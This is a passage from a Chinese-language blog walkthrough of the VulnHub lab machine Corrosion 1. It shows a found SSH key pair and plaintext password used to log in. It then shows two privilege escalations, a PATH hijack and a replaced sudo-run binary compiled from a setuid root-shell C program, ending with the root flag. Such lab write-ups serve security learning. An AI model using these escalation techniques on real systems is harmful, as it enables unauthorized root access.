class="hljs-operator">+</span>SCTQnhgj1AXq64ozVS1PbYBkVMCaS0dAbWGU1fWYCBy9Qdd0eK<br>NLZrlsGWyW19y6EBZRrrQYpFTddMrXiz226<span class="hljs-operator">+</span>ooubeMFqY0<span class="hljs-symbol">/2zB8JRE4e2s3+JGQmWtQ9Pk</span><br>wbzWGscf7w1YmG7LvV1U45JAoOfUhoLSy8OkZLoKJ7NMJWYASj<span class="hljs-symbol">/dVa3X2EvBsFWPYkVJnu</span><br>WWR6gS<span class="hljs-operator">/</span>pLqQ5rfAAAACXJhbmR5QHRvcgE<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><ul><li><em>id_rsa.pub</em> （公钥）</li></ul><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh<span class="hljs-operator">-</span>rsa <span class="hljs-type">AAAAB3NzaC1yc2EAAAADAQABAAABgQDgg1AuazHZFTVcL5aXj3WSF8aE60aAPEm0SmKgpBjUryBjuBgRxjBK</span><span class="hljs-regexp">/2WSxsZArZ32R6kZG6DQ+KxbSFm2ZNdHB2C87W5FwnMO3nyIcTSLK6vYQHSHnRmcPUqEMNEyhcyilW1cj3pl1PQRgY1JE5U/</span>5FF3KQEVlRCc1YIMobhhXtvuh27dwN8<span class="hljs-operator">+</span><span class="hljs-type">Fn0</span><span class="hljs-regexp">/KoWbr/</span>aUJB05F6k1Tl2SH9UiHZTAHR3kpJjMgf40NDwguhY7NvleJbIurkGoo8i6fb<span class="hljs-operator">+</span><span class="hljs-type">CTdku7djDFgsScbq7wttEJh2JvxMN</span><span class="hljs-regexp">/4LrrC2riFtIptvscbiko75Lqx8+8WMopHYPhVuooqBIVioO/</span>g8rwgPnyAesaRX899fiUP<span class="hljs-operator">+</span>dqDSPZLWjSWUxHT<span class="hljs-operator">+</span><span class="hljs-type">CZLxyJmq9YdPWNUYdV7GsbSnbm38TCcshtQ2sUlg9T1A</span><span class="hljs-operator">+</span>rQTohTHpLvkTpz1y3BRZOD9kmqNduw6Ifjc3SOvbqkv6VvdWQkvdH0ZqktN84WhkFeFy6ZjQaKP07InkuPXqx57CppARZcl9HGU<span class="hljs-operator">=</span> randy<span class="hljs-meta">@tor</span><br></code></pre></td></tr></table></figure><ul><li><em>my_password.txt</em> （文本文档）</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">randylovesgoldfish1998<br></code></pre></td></tr></table></figure><br/><br/><br/><br/><p><strong>估计就是randy的密码，我们直接ssh登录它</strong></p><br/><br/><br/><br/><p><strong>越权登录：</strong></p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/15.jpg" class="image.jpg"><p>继续上面的常规信息收集，最后发现在sudo -l，可以root用户不过要密码操作<code>/home/randy/tools/easysysinfo</code>文件</p><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/16.jpg" class="image.jpg"><br/><br/><br/><br/><p><strong>提权：</strong></p><ul><li><p>环境变量提权：（由于发现<code>/home/randy/tools/easysysinfo</code>文件具有s，也就是SUID权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ echo &#x27;/bin/bash&#x27; &gt; /tmp/cat<br><br>randy@corrosion:~$ chmod +x /tmp/cat<br><br>randy@corrosion:~$ echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br><br>randy@corrosion:~$ export PATH=/tmp:$PATH<br><br>randy@corrosion:~$ echo $PATH<br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br><br>randy@corrosion:~$ sudo /home/randy/tools/easysysinfo<br>Tue Nov 14 11:19:38 AM MST 2023<br>127.0.0.1       localhost<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">The following lines are desirable <span class="hljs-keyword">for</span> IPv6 capable hosts</span><br>::1     ip6-localhost ip6-loopback<br>fe00::0 ip6-localnet<br>ff00::0 ip6-mcastprefix<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters<br>Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br><br>randy@corrosion:~/tools$ /home/randy/tools/easysysinfo<br>Tue Nov 14 07:15:29 AM MST 2023<br><br>root@corrosion:~/tools#<br></code></pre></td></tr></table></figure></li></ul><br/><br/><br/><br/><ul><li><p>SUDO提权：（修改&#x2F; 覆盖文件提权）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~/tools$ tee easysysinfo.c &lt;&lt;-&#x27;EOF&#x27;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span><br>void main()<br>&#123; setuid(0);<br>  setgid(0);<br>  system(&quot;/bin/bash -i&quot;);<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">EOF</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span><br>void main()<br>&#123; setuid(0);<br>  setgid(0);<br>  system(&quot;/bin/bash -i&quot;);<br>&#125;<br><br>randy@corrosion:~/tools$ gcc -o easysysinfo easysysinfo.c<br><br>randy@corrosion:~/tools$ ls -al<br>total 32<br>drwxrwxr-x  2 randy randy  4096 Nov 14 11:44 .<br>drwxr-x--- 17 randy randy  4096 Jul 30  2021 ..<br>-rwxrwxr-x  1 randy randy 16192 Nov 14 11:44 easysysinfo<br>-rw-rw-r--  1 randy randy   106 Nov 14 11:44 easysysinfo.c<br>-rwxr-xr-x  1 root  root    318 Jul 29  2021 easysysinfo.py<br><br>randy@corrosion:~/tools$ /home/randy/tools/easysysinfo<br><br>randy@corrosion:~/tools$ sudo /home/randy/tools/easysysinfo<br>[sudo] password for randy: <br><br>root@corrosion:/home/randy/tools# cd /root<br>root@corrosion:~# ls -al<br>total 52<br>drwx------  7 root root 4096 Jul 30  2021 .<br>drwxr-xr-x 20 root root 4096 Jul 29  2021 ..<br>-rw-r--r--  1 root root  461 Jul 30  2021 .bash_history<br>-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc<br>drwx------  2 root root 4096 Apr 20  2021 .cache<br>drwx------  3 root root 4096 Jul 30  2021 .config<br>drwxr-xr-x  2 root root 4096 Jul 30  2021 creds<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 .local<br>-rw-r--r--  1 root root   10 Nov 14 11:46 logs.txt<br>-rw-r--r--  1 root root  161 Sep 16  2020 .profile<br>-rw-r--r--  1 root root  251 Jul 30  2021 root.txt<br>-rw-r--r--  1 root root   66 Jul 30  2021 .selected_editor<br>drwxr-xr-x  3 root root 4096 Jul 29  2021 snap<br>-rw-r--r--  1 root root    0 Jul 30  2021 .sudo_as_admin_successful<br><br>root@corrosion:~# cat root.txt<br>FLAG: 4NJSA99SD7922197D7S90PLAWE <br><br>Congrats! Hope you enjoyed my first machine posted on VulnHub! <br>Ping me on twitter @proxyprgrammer for any suggestions.<br><br>Youtube: https://www.youtube.com/c/ProxyProgrammer<br>Twitter: https://twitter.com/proxyprgrammer<br><br>root@corrosion:~#<br></code></pre></td></tr></table></figure></li></ul><br/><br/><p>至此靶场结束通关，还是挺好玩的</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
